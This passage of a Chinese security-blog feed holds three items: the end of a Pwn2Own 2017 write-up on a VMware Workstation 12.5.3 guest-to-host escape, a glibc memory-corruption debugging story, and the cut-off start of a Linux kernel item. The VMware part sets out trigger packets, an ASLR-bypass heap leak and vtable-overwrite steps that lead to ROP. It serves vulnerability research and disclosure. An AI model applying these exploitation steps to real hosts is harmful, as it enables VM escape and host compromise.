&lt;/code&gt;&lt;p&gt;有了以上的知识，我决定看看Version 3中的DnD/CP功能中是不是也存在类似的问题。令人惊讶的是，几乎相同的漏洞存在于Version 3的代码中（这个漏洞最初通过逆向分析来发现，但是我们后来意识到v3的代码也在open-vm-tools的git仓库中）：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;Bool  
DnD_TransportBufAppendPacket(DnDTransportBuffer *buf,          // IN/OUT  
                             DnDTransportPacketHeader *packet, // IN
                             size_t packetSize)                // IN
{
   ASSERT(buf);
   ASSERT(packetSize == (packet-&amp;gt;payloadSize + DND_TRANSPORT_PACKET_HEADER_SIZE) &amp;amp;&amp;amp;
          packetSize &amp;lt;= DND_MAX_TRANSPORT_PACKET_SIZE &amp;amp;&amp;amp;
          (packet-&amp;gt;payloadSize + packet-&amp;gt;offset) &amp;lt;= packet-&amp;gt;totalSize &amp;amp;&amp;amp;
          packet-&amp;gt;totalSize &amp;lt;= DNDMSG_MAX_ARGSZ);

   if (packetSize != (packet-&amp;gt;payloadSize + DND_TRANSPORT_PACKET_HEADER_SIZE) ||
       packetSize &amp;gt; DND_MAX_TRANSPORT_PACKET_SIZE ||
       (packet-&amp;gt;payloadSize + packet-&amp;gt;offset) &amp;gt; packet-&amp;gt;totalSize || //[1]
       packet-&amp;gt;totalSize &amp;gt; DNDMSG_MAX_ARGSZ) {
      goto error;
   }

   /*
    * If seqNum does not match, it means either this is the first packet, or there
    * is a timeout in another side. Reset the buffer in all cases.
    */
   if (buf-&amp;gt;seqNum != packet-&amp;gt;seqNum) {
      DnD_TransportBufReset(buf);
   }

   if (!buf-&amp;gt;buffer) {
      ASSERT(!packet-&amp;gt;offset);
      if (packet-&amp;gt;offset) {
         goto error;
      }
      buf-&amp;gt;buffer = Util_SafeMalloc(packet-&amp;gt;totalSize);
      buf-&amp;gt;totalSize = packet-&amp;gt;totalSize;
      buf-&amp;gt;seqNum = packet-&amp;gt;seqNum;
      buf-&amp;gt;offset = 0;
   }

   if (buf-&amp;gt;offset != packet-&amp;gt;offset) {
      goto error;
   }

   memcpy(buf-&amp;gt;buffer + buf-&amp;gt;offset,
          packet-&amp;gt;payload,
          packet-&amp;gt;payloadSize);
   buf-&amp;gt;offset += packet-&amp;gt;payloadSize;
   return TRUE;

error:  
   DnD_TransportBufReset(buf);
   return FALSE;
}
&lt;/code&gt;&lt;p&gt;Version 3的DnD/CP在分片重组时，上面的函数会被调用。此处我们可以在[1]处看到与之前相同的情形，代码依然假设后续分片中的totalSize会和第一个分片一致。因此这个漏洞可以用和之前相同的方法触发：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;packet 1{  
 ...
 totalSize = 0x100
 payloadOffset = 0
 payloadSize = 0x50
 seqNum = 0x41414141
 ...
 #...0x50 bytes...#
}

packet 2{  
 ...
 totalSize = 0x1000
 payloadOffset = 0x50
 payloadSize = 0x100
 seqNum = 0x41414141
 ...
 #...0x100 bytes...#
}
&lt;/code&gt;&lt;p&gt;在Pwn2Own这样的比赛中，这个漏洞是很弱的，因为它只是受到之前漏洞的启发，而且甚至可以说是同一个。因此，这样的漏洞在赛前被修补并不惊讶（好吧，也许我们并不希望这个漏洞在比赛前一天被修复）。对应的VMware安全公告在&lt;a href=&quot;https://www.vmware.com/security/advisories/VMSA-2017-0005.html&quot; data-editable=&quot;true&quot; data-title=&quot;这里&quot;&gt;这里&lt;/a&gt;。受到这个漏洞影响的VMWare Workstation Pro最新版本是12.5.3。&lt;/p&gt;&lt;p&gt;接下来，让我们看一看这个漏洞是如何被用来完成从guest到host的逃逸的！&lt;/p&gt;&lt;h2&gt;4. 漏洞利用&lt;/h2&gt;&lt;p&gt;为了实现代码执行，我们需要在堆上覆盖一个函数指针，或者破坏C++对象的虚表指针。&lt;/p&gt;&lt;p&gt;首先让我们看一看如何将DnD/CP协议的设置为version 3，依次发送下列RPCI命令即可：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;tools.capability.dnd_version 3  
tools.capability.copypaste_version 3  
vmx.capability.dnd_version  
vmx.capability.copypaste_version  
&lt;/code&gt;&lt;p&gt;前两行消息分别设置了DnD和Copy/Paste的版本，后续两行用来查询版本，这是必须的，因为只有查询版本才会真正触发版本切换。RPCI命令vmx.capability.dnd_version会检查DnD/CP协议的版本是否已被修改，如果是，就会创建一个对应版本的C++对象。对于version 3，2个大小为0xA8的C++对象会被创建，一个用于DnD命令，另一个用于Copy/Paste命令。&lt;/p&gt;&lt;p&gt;这个漏洞不仅可以让我们控制分配的大小和溢出的大小，而且能够让我们进行多次越界写。理想的话，我们可以用它分配大小为0xA8的内存块，并让它分配在C++对象之前，然后利用堆溢出改写C++对象的vtable指针，使其指向可控内存，从而实现代码执行。&lt;/p&gt;&lt;p&gt;这并非易事，在此之前我们必须解决一些其他问题。首先我们需要找到一个方法来绕过ASLR，同时处理好Windows Low Fragmented Heap。&lt;/p&gt;&lt;h2&gt;4.1 绕过ASLR&lt;/h2&gt;&lt;p&gt;一般来说，我们需要找到一个对象，通过溢出来影响它，然后实现信息泄露。例如破坏一个带有长度或者数据指针的对象，并且可以从guest读取，然而我们没有找到这种对象。于是我们逆向了更多的RPCI命令处理函数，来寻找可用的东西。那些成对的命令特别引人关注，例如你能用一个命令来设置一些数据，同时又能用相关命令来取回数据，最终我们找到的是一对命令info-set和info-get：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;info-set guestinfo.KEY VALUE  
info-get guestinfo.KEY  
&lt;/code&gt;&lt;p&gt;VALUE是一个字符串，字符串的长度可以控制堆上buffer的分配长度，而且我们可以分配任意多的字符串。但是如何用这些字符串来泄露数据呢？我们可以通过溢出来覆盖结尾的null字节，让字符串连接上相邻的内存块。如果我们能够在发生溢出的内存块和DnD或CP对象之间分配一个字符串，那么我们就能泄露对象的vtable地址，从而我们就可以知道vmware-vmx的地址。尽管Windows的LFH堆分配存在随机化，但我们能够分配任意多的字符串，因此可以增加实现上述堆布局的可能性，但是我们仍然无法控制溢出buffer后面分配的是DnD还是CP对象。经过我们的测试，通过调整一些参数，例如分配和释放不同数量的字符串，我们可以实现60%到80%的成功率。&lt;/p&gt;&lt;p&gt;下图总结了我们构建的堆布局情况（Ov代表溢出内存块，S代表String，T代表目标对象）。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-93e4655e592de30605e67ece4e9f1ce5_r.png&quot; data-rawwidth=&quot;1292&quot; data-rawheight=&quot;680&quot;&gt;&lt;p&gt;我们的策略是：首先分配一些填满“A”的字符串，然后通过溢出写入一些“B”，接下来读取所有分配的字符串，其中含有“B”的就是被溢出的字符串。这样我们就找到了一个字符串可以被用来读取泄露的数据，然后以bucket的内存块大小0xA8的粒度继续溢出，每次溢出后都检查泄露的数据。由于DnD和CP对象的vtable距离vmware-vmx基地址的偏移是固定的，每次溢出后只需要检查最低一些数据位，就能够判断溢出是否到达了目标对象。&lt;/p&gt;&lt;h2&gt;4.2 获取代码执行&lt;/h2&gt;&lt;p&gt;现在我们实现了信息泄露，也能知道溢出的是哪个C++对象，接下来要实现代码执行。我们需要处理两种情形：溢出CopyPaste和DnD。需要指出的是能利用的代码路径有很多，我们只是选择了其中一个。&lt;/p&gt;&lt;h2&gt;4.2.1 覆盖CopyPaste对象&lt;/h2&gt;&lt;p&gt;对于CopyPaste对象，我们可以覆盖虚表指针，让它指向我们可控的其他数据。我们需要找到一个指针，指针指向的数据是可控并被用做对象的虚表。为此我们使用了另一个RPCI命令unity.window.contents.start。这个命令主要用于Unity模式下，在host上绘制一些图像。这个操作可以让我们往相对vmware-vmx偏移已知的位置写入一些数据。该命令接收的参数是图像的宽度和高度，二者都是32位，合并起来我们就在已知位置获得了一个64位的数据。我们用它来作为虚表中的一个指针，通过发送一个CopyPast命令即可触发该虚函数调用，步骤如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;发送unity.window.contents.start命令，通过指定参数宽度和高度，往全局变量处写入一个64位的栈迁移gadget地址&lt;/li&gt;&lt;li&gt;覆盖对象虚表指针，指向伪造的虚表（调整虚表地址偏移）&lt;/li&gt;&lt;li&gt;发送CopyPaste命令，触发虚函数调用&lt;/li&gt;&lt;li&gt;ROP&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;4.2.2 覆盖DnD对象&lt;/h2&gt;&lt;p&gt;对于DnD对象，我们不能只覆盖vtable指针，因为在发生溢出之后vtable会立马被访问，另一个虚函数会被调用，而目前我们只能通过unity图像的宽度和高度控制一个qword，所以无法控制更大的虚表。&lt;/p&gt;&lt;p&gt;让我们看一看DnD和CP对象的结构，总结如下（一些类似的结构可以在open-vm-tools中找到，但是在vmware-vmx中会略有区别）：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;DnD_CopyPaste_RpcV3{  
    void * vtable;
    ...
    uint64_t ifacetype;
    RpcUtil{
        void * vtable;
        RpcBase * mRpc;
        DnDTransportBuffer{
            uint64_t seqNum;
            uint8_t * buffer;
            uint64_t totalSize;
            uint64_t offset;
            ...
        }
        ...
    }
}

RpcBase{  
    void * vtable;
    ...
}
&lt;/code&gt;&lt;p&gt;我们在此省略了结构中很多与本文无关的属性。对象中有个指针指向另一个C++对象RpcBase，如果我们能用一个可控数据的指针的指针覆盖mRpc这个域，那我们就控制了RpcBase的vtable。对此我们可以继续使用unity.window.contents.start命令来来控制mRpc，该命令的另一个参数是imgsize，这个参数代表分配的图像buffer的大小。这个buffer分配出来后，它的地址会存在vmware-vmx的固定偏移处。我们可以使用命令unity.window.contents.chunk来填充buffer的内容。步骤如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;发送unity.window.contents.start命令来分配一个buffer，后续我们用它来存储一个伪造的vtable。&lt;/li&gt;&lt;li&gt;发送unity.window.contents.chunk命令来填充伪造的vtable，其中填入一个栈迁移的gadget&lt;/li&gt;&lt;li&gt;通过溢出覆盖DnD对象的mRpc域，让它指向存储buffer地址的地方（某全局变量处），即写入一个指针的指针&lt;/li&gt;&lt;li&gt;通过发送DnD命令来触发mRpc域的虚函数调用&lt;/li&gt;&lt;li&gt;ROP&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;P.S：vmware-vmx进程中有一个可读可写可执行的内存页（至少在版本12.5.3中存在）。&lt;/p&gt;&lt;h2&gt;4.3 稳定性讨论&lt;/h2&gt;&lt;p&gt;正如前面提及的，因为Windows LFH堆的随机化，当前的exploit无法做到100%成功率。不过可以尝试下列方法来提高成功率：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;观察0xA8大小的内存分配，考虑是否可以通过一些malloc和free的调用来实现确定性的LFH分配，参考&lt;a href=&quot;http://illmatics.com/Understanding_the_LFH.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;这里&quot;&gt;这里&lt;/a&gt;和&lt;a href=&quot;https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;这里&quot;&gt;这里&lt;/a&gt;。&lt;/li&gt;&lt;li&gt;寻找堆上的其他C++对象，尤其是那些可以在堆上喷射的&lt;/li&gt;&lt;li&gt;寻找堆上其他带有函数指针的对象，尤其是那些可以在堆上喷射的&lt;/li&gt;&lt;li&gt;找到一个独立的信息泄漏漏洞&lt;/li&gt;&lt;li&gt;打开更多脑洞&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;4.4 演示效果&lt;/h2&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d158e3218b51842880080a282a3bf0cd_r.png&quot; data-rawwidth=&quot;960&quot; data-rawheight=&quot;540&quot;&gt;&lt;br&gt;&lt;p&gt;演示视频：&lt;/p&gt;&lt;video id=&quot;105076&quot; data-swfurl=&quot;&quot; poster=&quot;&quot; data-sourceurl=&quot;http://v.youku.com/v_show/id_XMjg3MjcwMzU4MA==.html?spm=a2h3j.8428770.3416059.1&quot; data-name=&quot;VMware workstation 12.5.3逃逸演示—在线播放—优酷网，视频高清在线观看&quot; data-video-id=&quot;&quot; data-video-playable=&quot;&quot; data-lens-id=&quot;&quot;&gt;&lt;/video&gt;&lt;br&gt;&lt;h3&gt;5. 感想与总结&lt;/h3&gt;&lt;p&gt;“No pwn no fun”，如果你想参加Pwn2Own这样的比赛，你就需要准备多个漏洞，或者找到高质量的漏洞。&lt;/p&gt;&lt;h2&gt;6. 我是广告&lt;/h2&gt;&lt;p&gt;对安全研究、安全研发感兴趣的朋友欢迎投简历到hr@chaitin.com。&lt;/p&gt;</description>
<author>杨坤</author>
<guid isPermaLink="false">2017-07-06-27733895</guid>
<pubDate>Thu, 06 Jul 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>一个sizeof引发的血案</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-05-12-26815897.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;一个sizeof引发的血案&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/26815897&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6ebd48b93e64e584a7fc92cd1e45c2c0_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;0x00 写在最前&lt;/h2&gt;&lt;p&gt;在这个系列中，我们将会和大家分享一些产品开发过程中所遇到的一些技术难题和具体的解决过程与解决方法。在系列的第一篇中，我们首先将分享一次线上系统崩溃的完整调查过程。希望能给大家提供一点解决类似问题的思路。&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;h2&gt;0x10 问题描述&lt;/h2&gt;&lt;p&gt;某日例行检查时，发现一个部署在生产环境中的服务器程序会随机崩溃并产生coredump。其特征是对于某些特定的输入时，会让程序直接崩溃退出。事关重大，赶紧抓下来看看程序哪里出BUG了。&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;h2&gt;0x20 收集信息&lt;/h2&gt;&lt;p&gt;搜集到足够多的调试信息是问题排查的基础，包括但不限于程序的版本信息、崩溃时的现场信息（Coredump，Syslog等）、程序依赖的动态链接库等。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Coredump&lt;/b&gt;&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;p&gt;Coredump里保存了程序运行时的内存镜像和崩溃现场的寄存器信息，配合gdb等调试工具可以有效的复原现场，通常情况下能够帮助我们快速定位问题出现的位置。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;程序binary&lt;/b&gt;&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;p&gt;由于生产环境中的服务器程序是不携带调试信息的，这样在调试coredump时会很不方便（例如无法看到调用堆栈的函数名和行号等信息）。一个好的办法时使用相同版本的、但是带有调试信息的binary进行调试。因此，在发布程序时，一个好的做法是生成一个带有调试信息的binary，然后使用&lt;i&gt;strip&lt;/i&gt;之类的工具在这个binary基础上生成不带调试信息的binary，在生产环境中实际使用。这样在程序出现问题时，便可以很容易根据程序的版本信息找到方便调试的binary。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;动态链接库&lt;/b&gt;&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;p&gt;通常，一个可执行程序会依赖特定的动态链接库。由于调试过程无法在生产环境中的机器上完成，因此我们需要将应用程序所依赖的动态库都拷贝出来。这样做的目的是为了保证调试所使用的动态库同程序运行时所使用的一致，如果版本不一致的话，得到的调试信息会不准确。&lt;/p&gt;&lt;p&gt;在Linux系统中，可以用&lt;i&gt;ldd&lt;/i&gt;命令来查看一个应用程序所依赖的动态库信息。&lt;/p&gt;&lt;p&gt;在gdb中，可以通过&lt;i&gt;set sysroot [Directory]&lt;/i&gt;指令让gdb加载我们指定的动态库而不是直接使用系统的动态库。&lt;/p&gt;&lt;h2&gt;0x30 分析Core&lt;/h2&gt;&lt;p&gt;收集到所需要的信息后，便可以祭出gdb以深入coredump查看问题出现的原因。&lt;/p&gt;&lt;p&gt;首先，使用bt指令，我们可以让gdb打印出崩溃时的程序调用堆栈。&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-426db407b6a742619a2f994bba464e3d_r.png&quot; data-rawwidth=&quot;820&quot; data-rawheight=&quot;499&quot;&gt;通过调用堆栈，可以看到，程序是在执行free这个函数时触发了abort导致程序异常终止。malloc和free这对函数大家一定不陌生，他们是libc为应用程序所提供的一套用于申请/释放内存的函数接口。但是为什么程序在调用free的时候会导致异常退出呢？这是因为libc为我们的程序维护了运行时的内存分配信息，而如果我们的程序在运行过程中无意间破坏了libc用来管理内存分配的元数据的话，就会导致在执行free函数时，libc发现自己的一些数据被破坏了，从而直接抛出异常来终止程序。也就是说，我们的程序出现了所谓的内存破坏（Memory corruption）。&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;导致free出错的原因有很多，例如后文将会提到的double free也会导致free出错，需要根据程序具体分析&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;内存破坏&lt;/b&gt;&lt;/p&gt;对于Java等有VM的编程语言来说，通常很难遇到内存破坏的问题。JVM会在执行内存操作前通常会检查传入的参数，如果发现传入了非法的参数（例如数组读/写越界），则会触发异常处理流程。由于实际的破坏操作此时尚未被执行，因此通常并不会直接结束程序，而是让程序自己来决定如何处理。但是对于C程序来说，由于并没有类似的内存保护机制，因此非法的内存读写经常可以被成功的执行。&lt;p&gt;当非法内存操作成功执行之后，程序未必立刻就能产生异常并崩溃。往往需要等到实际读取到了被破坏的那片内存区域时，由于此时这部分内存已经被写入了非法的数据，这时程序才会真正的崩溃。正是由于这种延迟性，内存破坏问题往往难以调试。这是因为程序崩溃时的现场并非内存实际被破坏时的现场，因而难以定位内存破坏实际出现的时间和地点。这真是一个坏消息[sad]。&lt;/p&gt;&lt;p&gt;当然，有坏消息就会有好消息。libc“贴心”的在出现崩溃时向内存里写入了一点错误的信息。尽管只有一点信息，但是作为问题调查的开端，也还是极好的。&lt;/p&gt;&lt;p&gt;这个信息一般会在abort函数的调用堆栈中找到，我们先执行两次up，切换到abort函数的栈帧处。（什么？不记得栈帧是什么了？那你一定要读一读这篇文章：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/25816426&quot; data-editable=&quot;true&quot; data-title=&quot;链接&quot; class=&quot;&quot;&gt;链接&lt;/a&gt;）。&lt;/p&gt;&lt;p&gt;我们打印一下当前的栈帧，如下图所示。&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f22e5c3e718cf8528a67dbf42819f958_r.png&quot; data-rawwidth=&quot;821&quot; data-rawheight=&quot;154&quot;&gt;&lt;p&gt;可以看到，Arglist在内存地址0x7ffdead0b5f8处。&lt;/p&gt;&lt;p&gt;但是我们知道，abort函数其实是没有参数的，所以这个地址向后的内存应该位于上一层函数的栈帧内。我们打印一下这块内存的内容看一下里面都有啥。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c92c0029eebeb4be2b6a4a52af34fdaf_r.png&quot; data-rawwidth=&quot;425&quot; data-rawheight=&quot;155&quot;&gt;可以看到，栈上有一些看上去像是指针的变量（64位系统的指针长度是8字节），我们尝试着以字符串的方式输出一下这几个（看上去像是指针的）指针所指向的内容。&lt;img src=&quot;https://pic2.zhimg.com/v2-238f3b5f5886c070e76f732974ad6181_r.png&quot; data-rawwidth=&quot;370&quot; data-rawheight=&quot;204&quot;&gt;&lt;p&gt;果然，这些指针指向了一些字符串，而这些字符串描述了free出错时的错误信息：double free or corruption (!prev)。实际上，如果读者有兴趣去看一下glibc（GNU libc）的free函数的实现的话，就可以发现glibc会在执行free操作时执行一些完整性检查，如果检查失败的话，就会输出一些错误信息并调用abort函数来终止程序。到这里，也进一步验证了我们之前的判断：某些用于完整性检查的数据被破坏了。&lt;/p&gt;&lt;p&gt;我们来看glibc提供的出错信息：double free or corruption (!prev)。这提示了两种出错的可能性，第一个显然就是double free了，就是说对同一个内存地址执行了多次free操作。根据之前得到的调试信息（bt），我们在代码对应的位置并没有发现有double free的可能性，所以问题极大的可能仍然是内存破坏引起的。&lt;/p&gt;&lt;p&gt;如果真的是内存破坏的话，上面那句错误信息的后半句可能会给我们很大的帮助。我们知道corruption说的自然是内存破坏，那 (!prev)又代表了什么呢？为了解答这个问题，我们需要深入glibc来了解一下malloc/free究竟是如何管理堆内存的。&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;glibc会在free出错时将错误信息输出到syslog。但是由于某些特殊的原因，我们无法在生产环境的机器上获取到这部分信息&lt;/blockquote&gt;&lt;h2&gt;0x40 堆内存布局&lt;/h2&gt;&lt;p&gt;glibc采用的是一个被称作&lt;a href=&quot;http://www.malloc.de/en/&quot; data-editable=&quot;true&quot; data-title=&quot;ptmalloc&quot;&gt;ptmalloc&lt;/a&gt;的内存分配器。由于我们并不关心ptmalloc有关多线程性能优化的设计，因此我们并不需要去了解Arena以及不同的Bin的实现细节，我们只需要理解内存分配的基本单元：内存区块（Memory Chunk）即可。在ptmalloc的实现中，内存区块通过一种被称作Boundary Tag的方式串联在一起，相邻的区块之间形成一个类似于链表的数据结构。Boundary Tag会在一个内存区块的开头和结尾都存放着该片内存区域的大小（注：结尾处也有可能并没有存放当前区块的size信息，这取决于当前区块的状态，见后文）。这样做的好处是既可以向后遍历各个内存区块，又可以通过存储在区块之前的前一个区块的size信息向前遍历各个区块。一个内存区块的示例图如下。&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9a05ec6b16d78361c65803834fb11ca2_r.png&quot; data-rawwidth=&quot;591&quot; data-rawheight=&quot;298&quot;&gt;&lt;p&gt;如果当前的内存区块处于已分配状态的话，尾部next chunk处的size用来存放用户数据。如果处于未分配状态的话，尾部的size存放的是当前（对于后一个内存区块来说是前一块）内存区块的大小。这样在合并空闲区块时，就可以通过prev_size这个字段找到前一个空闲区块的起始位置，从而实现合并操作。一段连续的内存区块实例如下图所示（注：实际的实现可能会有不同）：&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ec9b51e9a85808e8b59bbda4f1e73f3c_r.png&quot; data-rawwidth=&quot;1270&quot; data-rawheight=&quot;443&quot;&gt;由于内存分配通常按一定方式（例如按16字节）进行字节对齐，因此size字段的低几位（跟平台和实现相关）永远是0。因此ptmalloc利用这个几个位来存放一些额外的信息。其中P位（通常是最低位）用来标识前一个内存区块是否处于已分配状态(prev_inuse)。利用这个信息，在释放内存时，如果发现前一个区块处于空闲状态，就可以将两个区块合并成为一个更大的区块，从而减少内存碎片的产生。同时，ptmalloc也可以在释放内存时检查这个位置的值是否是正确的：首先，当前正在释放的内存区块显然是处于inuse状态的；如果后一个区块的P位是0的话，则表示当前区块处于空闲状态。即对当前区块的状态的认识上，前后两个区块产生了分歧。如果不是两次对同一块内存调用了free的话，这只能说明后一个区块的状态位有可能已经被写入了非法值，亦即，后一个区块的内容已经被破坏了。而这也就是错误信息中!prev的含义。glibc中这个完整性检查部分的代码大概是下面这个样子：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;if (!prev_inuse(nextchunk)) {
    errstr = &quot;double free or corruption (!prev)&quot;;
    goto errout;
} &lt;/code&gt;&lt;h2&gt;0x50 查看被破坏的内存&lt;/h2&gt;&lt;p&gt;既然知道问题有可能是由于后一个区块被非法数据破坏所引起的，那我们干脆就来看一下后一个区块的数据被破坏成了什么样子。根据上一节对malloc的介绍，要找到后一个区块的位置，只需要找到当前区块的起始位置和大小，而大小可以通过size字段找到：只需要看一下free的参数向前一个字长处的内存即可。根据调用堆栈，我们可以知道free的参数是0x1043500，那我们就去看一下这个地址之前的malloc元数据。&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5faadcf15f091bc2c22fcf1ef9e337ba_r.png&quot; data-rawwidth=&quot;419&quot; data-rawheight=&quot;155&quot;&gt;如图中，0x1043500是传递给free的参数。由于我们的程序在malloc基础上实现了自己的内存管理，在内存区块前增加了额外0x20个字节（在64位PC上）的内存占用。因此malloc的size字段就位于地址0x1043500-0x20-0x08 = 0x10434d8处，并且从图中可以看到，size字段的值是0x1031。去掉最低位的P位信息后（在该示例中，P位的值显然是1。另外还有M位和A位，在该示例中都是0），我们算得该内存区块的实际大小是0x1030字节。就此，我们就可以根据当前内存区块的起始地址和大小来定位后一个内存区块的位置了，也就是0x10434d8+0x1030处。根据前面的说明，这个地址处存放的应当是后一个内存区块的size字段。现在我们来看看它的值究竟是多少。&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-630226041666af7d970fcb236887c2b0_r.png&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;153&quot;&gt;我们看到，本来应当是存放size字段的位置变成了疑似是字符串的值（地址0x1044508处）。而且毫无疑问，P位的值果然是0（也就是说它认为前一个区块并未处于inuse状态）。这就是free时报错的直接原因。我们把字符串打印出来看一下这段数据究竟是什么。&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-33531289c8bcb7d34bff3d61f581b55d_r.png&quot; data-rawwidth=&quot;308&quot; data-rawheight=&quot;36&quot;&gt;&lt;p&gt;看上去像是一串字符串’0’和逗号之类的东西，而且笔者敢对灯发誓这绝对不是合法的size值（否则内存得有多大。。）。有了具体的数据，就可以根据其内容到程序源代码中去查找究竟哪一部分代码有可能向内存中写入这样的数据。通过检查程序源代码，最终证明这是一个json字符串的一部分。又根据字符串的内容，我们最终定位到了对应的源代码的位置。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x60 问题真相&lt;/h2&gt;&lt;p&gt;我们先来看一段示例代码，其中包含了导致该问题的BUG（去掉了无关的返回值检查等）。&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;// 一段有问题的代码
const char *fmt = &quot;this is fmt: %s, blabla...&quot;;
...
char *data, *other_data;
size_t data_len, other_data_len;
...
size_t expected_len = (sizeof(fmt)-1-2) + data_len + other_data_len;
char *buf = alloc_memory(expected_len);
buf += snprintf(buf, expected_len, fmt, data);
memcpy(buf, other_data, other_data_len);
&lt;/code&gt;你能一眼看出问题所在么？问题就在于，在计算expected_len时，代码使用sizeof来计算字符串fmt的长度。但是要看清楚，fmt的类型是一个 &quot;char *&quot; 而不是 &quot;char []&quot; ！！！如果是char *的话，sizeof计算出来的只是一个指针的长度（64位系统上是8字节），这就导致计算得到的expected_len小于实际所需的内存。由于程序自身的内存管理会在内存分配时进行对齐（对于小内存区块，对齐到2的整数次幂），导致大多数情况下对齐之后多出来的部分大于少计算的那部分，从而并不会在每次执行时都导致崩溃，因而出现了一定的随机性，提高了问题排查的难度。&lt;h2&gt;0x70 总结&lt;/h2&gt;&lt;p&gt;本篇文章介绍了一次内存破坏的排查过程，在理解了glibc是如何管理内存的基础上，根据收集到的一点线索，可以定位到出现问题的代码，从而除掉BUG。所以，查BUG的过程中最重要的是啥呢？那当然是写代码要认真，不要写出BUG啊！不多说了，笔者要去发BUG红包了。。。我们下回再见。&lt;/p&gt;&lt;h2&gt;0x80 参考文献&lt;/h2&gt;1. &lt;a href=&quot;https://www.gnu.org/software/libc/libc.html&quot; data-editable=&quot;true&quot; data-title=&quot;The GNU C Library&quot; class=&quot;&quot;&gt;The GNU C Library&lt;/a&gt;&lt;p&gt;2. &lt;a href=&quot;https://github.com/emeryberger/Malloc-Implementations&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Malloc-Implementations&quot;&gt;Malloc-Implementations&lt;/a&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;3. &lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Understanding glibc malloc&quot;&gt;Understanding glibc malloc&lt;/a&gt;&lt;/p&gt;</description>
<author>Jinzhao Liu</author>
<guid isPermaLink="false">2017-05-12-26815897</guid>
<pubDate>Fri, 12 May 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Pwn2Own 2017 Linux 内核提权漏洞分析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-05-02-26674557.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Pwn2Own 2017 Linux 内核提权漏洞分析&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/26674557&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b8be0d30a9433bde321d233c7e5dface_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;0.前言&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在2017年PWN2OWN大赛中，长亭安全研究实验室（Chaitin Security Research Lab）成功演示了Ubuntu 16.10 